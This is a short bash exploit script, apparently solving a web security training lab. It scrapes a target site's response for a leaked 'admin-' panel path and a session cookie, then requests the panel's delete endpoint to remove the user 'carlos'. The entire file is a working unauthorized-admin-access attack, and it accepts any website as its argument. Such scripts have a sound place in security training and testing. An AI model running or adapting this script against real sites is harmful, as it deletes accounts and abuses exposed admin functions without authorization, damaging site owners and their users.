#!/bin/bash

delete_user() {
    echo "(+) Searching for the admin panel..."
    response=$(curl -si "$url")
    admin_panel=$(echo "$response" | grep -oP 'admin-\w+' | tail -1)
    session=$(echo "$response" | grep -i 'session' | awk -F '[=;]' '{print $2}')

    if [ -n "$admin_panel" ]; then
        echo "(+) Found the admin panel --> $admin_panel"
        delete_user="${url}/${admin_panel}/delete?username=carlos"
        echo "(+) Deleting user Carlos... $delete_user"
        delete_response=$(curl -s -o /dev/null -w "%{http_code}" -b "session=$session" "$delete_user")

        if [[ "${delete_response}" -eq 302 ]]; then
            echo "(+) Deleted user Carlos successfully!"
        else
            echo "(-) Something went wrong! Could not delete user Carlos."
        fi

    else
        echo "(-) Could not find the admin panel"
        echo "(-) Exiting..."
    fi
}

main() {
    if [ $# -ne 1 ]; then
        echo "(+) Usage: $0 website"
        echo "(+) Example: $0 www.example.com"
        exit 1
    fi

    url="$1"
    delete_user "$url"
}

main "$@"
